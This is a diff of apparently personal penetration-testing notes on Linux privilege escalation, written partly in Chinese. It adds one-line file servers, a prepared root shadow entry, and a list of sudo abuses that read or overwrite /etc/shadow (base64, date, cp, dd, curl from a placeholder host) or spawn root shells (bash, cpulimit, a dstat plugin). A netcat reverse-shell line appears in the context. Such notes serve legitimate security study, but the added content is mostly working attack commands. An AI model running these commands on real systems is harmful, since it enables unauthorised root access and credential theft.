@@ -514,11 +514,15 @@ reference:
 
 # 3. Linux Privilege Escalation
 
-## quick server
+## quick http server
 
 ```bash
 python -m http.server 80
 php -S 0:80
+ruby -run -ehttpd . -p80
+perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>80); $s->mount("/"=>{path=>"."}); $s->start'
+simple-http-server -p 80 # cargo install simple-http-server
+http-server -p 80 # npm install -g http-server
 ```
 
 ## better shell
@@ -584,10 +588,10 @@ nc -e /bin/sh <host> 4444
 主流
 
 - [UGO](03.pe/UGO.md)
-- [SUID, SGID](./03.pe/SUID-SGID)
-- Capabilities
-- AppArmor, Selinux
-- ACL
+- [SUID, SGID](03.pe/SUID-SGID-StickyBit.md)
+- [Capabilities](03.pe/Capabilities)
+- [AppArmor, Selinux](03.pe/AppArmor-Selinux)
+- [ACL](03.pe/ACL)
 
 其他
 
@@ -724,7 +728,10 @@ echo 'qwe:$1$qwe$D95bkH3CwpH6ffYU7pu0m/:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
 - mkpasswd
 ```bash
+# generate a root line
 mkpasswd -m sha-512 qwe
+# change root line in shadow file
+echo 'root:$6$Xolj1ebW9aRM/8xt$wj.BXJW73pUViZmZZhVyOqsyF35nlKx9t58gO2oLPbkhilOrDdyIQEvZjBYSjN9Dl5Dq6rOcA5rKC7/YtUTEt.:19509:0:99999:7:::' > shadow_entry
 ```
 
 ### 破解密码
@@ -742,7 +749,7 @@ john --worldlist=/usr/share/wordlists/rockyou.txt <hash>
 - /etc/passwd 文件可写
 	- 新添加一行有root权限的用户
 	- 修改root用户行的 x 为密文
-- sudo 预加载环境变量
+- [sudo](00.basic/linux/sudo) 预加载环境变量
 	- sudo -l
 	- env_reset
 	- env_keep+=LD_PRELOAD
@@ -876,6 +883,49 @@ sudo ash
 ```bash
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
+- base64 (base32, base58, basenc)
+```bash
+# cat /etc/shadow: Permission denied
+a=/etc/shadow
+sudo base64 "$a" | base64 -d
+```
+- bash (csh, dash, sh, tclsh, zsh)
+```bash
+sudo bash
+```
+- cp
+```bash
+a=/etc/shadow
+b=$(mktemp)
+echo 'root:$6$Xolj1ebW9aRM/8xt$wj.BXJW73pUViZmZZhVyOqsyF35nlKx9t58gO2oLPbkhilOrDdyIQEvZjBYSjN9Dl5Dq6rOcA5rKC7/YtUTEt.:19509:0:99999:7:::' > $b
+sudo /usr/bin/cp $b $a
+```
+- cpulimit
+```bash
+sudo cpulimit -l 100 [-f] /bin/bash
+```
+- curl
+```bash
+sudo curl http://<host>/shadow_entry -o /etc/shadow
+```
+- date
+```bash
+sudo date -f /etc/shadow
+```
+- dd
+```bash
+echo 'root:$6$Xolj1ebW9aRM/8xt$wj.BXJW73pUViZmZZhVyOqsyF35nlKx9t58gO2oLPbkhilOrDdyIQEvZjBYSjN9Dl5Dq6rOcA5rKC7/YtUTEt.:19509:0:99999:7:::' | sudo dd of=/etc/shadow
+```
+- [dstat](00.basic/linux/dstat)
+```bash
+# 利用 --<plug-name>
+# find dstat plugin dir
+find / -name dstat -type d 2>/dev/null
+# 插件名 dstat_<name>.py
+echo 'import os;os.execv("/bin/bash", ["bash"])' > dstat_a.py
+# 执行
+sudo dstat --a
+```
 
 # 4. Post Pentest
 
@@ -891,13 +941,13 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 
 # Appendix. 效率工具
 
-- vim
 - tmux
+- vim
 
 # Appendix. 学习资料
 
 - Linux Privilege Escalation from 红队笔记
-	- [ ] [Linux提权精讲：原理和枚举](https://www.bilibili.com/video/BV1Wh4y1H7LK)
-	- [ ] [Linux提权精讲：演示1 - 服务漏洞利用提权](https://www.bilibili.com/video/BV19s4y1D7Mt)
+	- [x] [Linux提权精讲：原理和枚举](https://www.bilibili.com/video/BV1Wh4y1H7LK)
+	- [x] [Linux提权精讲：演示1 - 服务漏洞利用提权](https://www.bilibili.com/video/BV19s4y1D7Mt)
 	- [ ] [Linux提权精讲：演示2 - 20种Linux渗透测试提权演示精讲](https://www.bilibili.com/video/BV1Es4y1M7ZL)
 	- [ ] [Linux提权精讲：Sudo风暴全70讲](https://www.bilibili.com/video/BV1DV4y1U7bT)
